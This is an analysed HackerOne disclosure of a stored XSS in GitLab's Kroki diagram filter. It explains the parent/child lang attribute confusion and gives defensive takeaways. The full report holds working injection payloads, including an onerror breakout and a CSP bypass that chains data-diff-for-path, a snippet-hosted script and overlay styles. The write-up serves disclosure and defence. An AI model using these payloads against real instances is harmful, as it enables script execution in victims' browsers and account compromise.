# Stored XSS via Kroki Diagram Filter - Attribute Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1731349 | https://hackerone.com/reports/1731349
- **Submitted:** 2022-12-17
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), HTML Attribute Injection, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
GitLab's Kroki diagram filter contains a stored XSS vulnerability where attackers can inject arbitrary HTML attributes into generated `img` tags by manipulating the `lang` attribute of parent `pre` elements. The vulnerability allows bypassing Content Security Policy through CSS styling manipulation and data attributes that trigger JavaScript functionality.

## Attack scenario
1. Attacker identifies that Kroki diagram processing matches CSS selectors for `pre[lang="diagramType"] > code` or `pre > code[lang="diagramType"]`
2. Attacker crafts malicious HTML with a parent `pre` element having a `lang` attribute containing quote characters and event handlers (e.g., `lang='f/" onerror=alert(1) '`)
3. When the diagram filter processes the element, it uses `node.parent['lang']` which contains the attacker's payload instead of the `code` child's valid `lang` attribute
4. The payload is unsanitized and directly interpolated into an `img` tag creation string: `<img src="#{image_src}" />`, breaking out of the src attribute
5. Without CSP, inline event handlers execute immediately; with CSP enabled, attacker uses `data-diff-for-path` attribute to load malicious JSON that bypasses CSP via jQuery execution
6. Attacker uses CSS positioning (`style` attribute) to overlay elements and trigger the diff-loading mechanism, executing arbitrary JavaScript in the victim's browser

## Root cause
The Kroki filter uses unsanitized user-controlled input (`node.parent['lang']`) directly in string interpolation to construct HTML. The CSS selector matching logic allows either the parent or child `lang` attribute, but the attribute selection prioritizes parent, enabling attribute confusion attacks. Additionally, string interpolation for HTML generation without proper escaping/encoding allows breaking out of attribute context.

## Attacker mindset
Attackers exploiting this likely seek to compromise user accounts on shared GitLab instances by injecting malicious scripts into issues, comments, or snippets. The ability to chain with other attributes (like `data-diff-for-path`) demonstrates understanding of application internals and jQuery-based JSON processing. The CSP bypass technique shows sophisticated knowledge of framework-specific vulnerabilities.

## Defensive takeaways
- Never use string interpolation for HTML generation; use proper DOM APIs or template engines with automatic escaping
- Validate and whitelist the `lang` attribute against a strict set of allowed diagram types before use
- Ensure CSS selector matching logic matches the subsequent usage logic to prevent attribute confusion
- Implement HTML entity encoding/escaping for all user-controlled values inserted into HTML contexts
- Apply Content Security Policy with `unsafe-inline` disabled to mitigate XSS impact
- Restrict data attributes that trigger sensitive functionality (e.g., `data-diff-for-path`) from user-controlled content
- Use Nokogiri's built-in attribute setting methods instead of string concatenation
- Implement parser-level defenses to sanitize or reject `pre` elements with suspicious attribute combinations

## Variant hunting
Search for other filter classes using string interpolation for HTML generation (particularly Banzai filters)
Audit all uses of `node.parent['attribute'] || node['attribute']` patterns for attribute confusion vulnerabilities
Check for other uses of `Nokogiri::HTML::DocumentFragment.parse()` with unsanitized user input
Review other data attributes (e.g., `data-*`) that trigger JavaScript functionality and could be injected
Look for similar patterns in markdown processing pipelines where parent/child element attributes are merged
Test other diagram rendering libraries integrated into GitLab (PlantUML, Mermaid) for similar issues

## MITRE ATT&CK
- T1190
- T1059
- T1189
- T1566

## Notes
This is a particularly sophisticated vulnerability combining multiple attack techniques: (1) attribute injection via quote breakout, (2) CSS-based overlay attacks to trigger clickable elements, (3) jQuery-based CSP bypass via data attributes, and (4) abuse of legitimate framework functionality. The report demonstrates deep understanding of both the vulnerability and the application's architecture. The Kroki filter vulnerability pattern is critical because markdown processors are often trusted code paths with reduced input validation.

## Full report
<details><summary>Expand</summary>

### Summary

If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the resulting `img` tag. 

The css selector for finding a valid node to convert into a kroki diagram checks for either `pre[lang="#{diagram_type}"] > code` or for `pre > code[lang="#{diagram_type}"]`, but the diagram type is then set using `node.parent['lang'] || node['lang']`.

So if the `code` block has a valid lang (such as `wavedrom`) then the css selector will match, but if the parent `pre` also has a `lang` attribute then it will be the one that is used and can be an arbitrary value.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L17
```ruby
        diagram_selectors = ::Gitlab::Kroki.formats(settings)
                                .map do |diagram_type|
                                  %(pre[lang="#{diagram_type}"] > code,
                                  pre > code[lang="#{diagram_type}"])
                                end
                                .join(', ')

        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)
        return doc unless doc.at_xpath(xpath)

        diagram_format = "svg"
        doc.xpath(xpath).each do |node|
          diagram_type = node.parent['lang'] || node['lang']
          diagram_src = node.content
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
```

The `diagram_type` is then used as-is to create a url, which is used to create an image with `<img src="#{image_src}" />`. So if a double quote is used in the `diagram_type` then arbitrary attributes can be added (apart from `class` as that is replaced just below).

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L31
```ruby
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
          img_tag = img_tag.children.first

          next if img_tag.nil?

          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT
          img_tag.set_attribute('hidden', '') if lazy_load
          img_tag.set_attribute('class', 'js-render-kroki')

          img_tag.set_attribute('data-diagram', diagram_type)
          img_tag.set_attribute('data-diagram-src', "data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}")

          node.parent.replace(img_tag)
```

### Steps to reproduce

1. On a self-hosted gitlab, ensure that `Kroki` is enabled at `/admin/application_settings/general`{F2080922} 
1. Create an issue and use the following payload `<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>`
1. Reload/Visit the issue
1. If you do not have CSP enabled you will see the alert pop, otherwise you will see a CSP violation in the console such as `Refused to execute inline event handler because it violates the following Content Security Policy directive`

Since the `class` attribute cannot be set finding a CSP bypass was a bit tricky but there are still a few `data` based attributes that can be used, one of them being `data-diff-for-path` from `single_file_diff.js`. This is used as the path to load when the "expand diff" chevron is clicked allowing an arbitrary json file to be loaded and have jquery execute it to bypass the CSP.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/app/assets/javascripts/single_file_diff.js#L77
```javascript
    return axios
      .get(this.diffForPath)
      .then(({ data }) => {
        this.loadingContent.hide();
        if (data.html) {
          this.content = $(data.html);
```

Since clicking the chevron is a bit unlikely, we can inject the `style` attribute to make the kroki overlay the entire page,  which when clicked injects some styles to make the `chevron` now overlay the entire page. 

1. Enable CSP on gitlab - https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy
1. Create a public snippet  with a json file `aaa.json` containing `{"html":"<script>alert(document.domain)</script>"}`, then open the `raw` version and make note of the path.
1. Create a new project and commit a readme
1. View the individual commit (eg http://gitlab.wbowling.info/root/kroki1/-/commit/f4170b940214abeebc6fd7503f9500c72c358613)
1. Add a comment to a line of the commit using the following payload, replacing `data-diff-for-path` with the path to your json file noted above:
```html
<a>
    <pre lang='/" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '>
        <code lang="wavedrom">csp</code>
    </pre>
    <pre
        lang='/" id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;" data-triggers="click" data-toggle=popover data-html=true data-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb" data-content=ggg '>
    <code lang="wavedrom">
    bypass
    </code>
    </pre>
</a>
```
1. Reload the page
1. Clicking anywhere on the page twice will trigger the xss

{F2080931}

### Impact

Allows arbitrary javascript to be executed when a victim views a comment 

### What is the current *bug* behavior?

The the lang attribute from the parent node is always used even if the css selector matches the child node

### What is the expected *correct* behavior?

The lang attribute should only be used if it is actually valid. The `img` tag should also be created using `content_tag` instead of string concatination.

### Output of checks
#### Results of GitLab environment info

```
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.6p219
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	15.6.2-ee
Revision:	08b668e8740
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.12
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.13.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## Impact
Allows arbitrary javascript to be executed when a victim views a comment 


</details>

---
*Analysed by Claude on 2026-05-12*
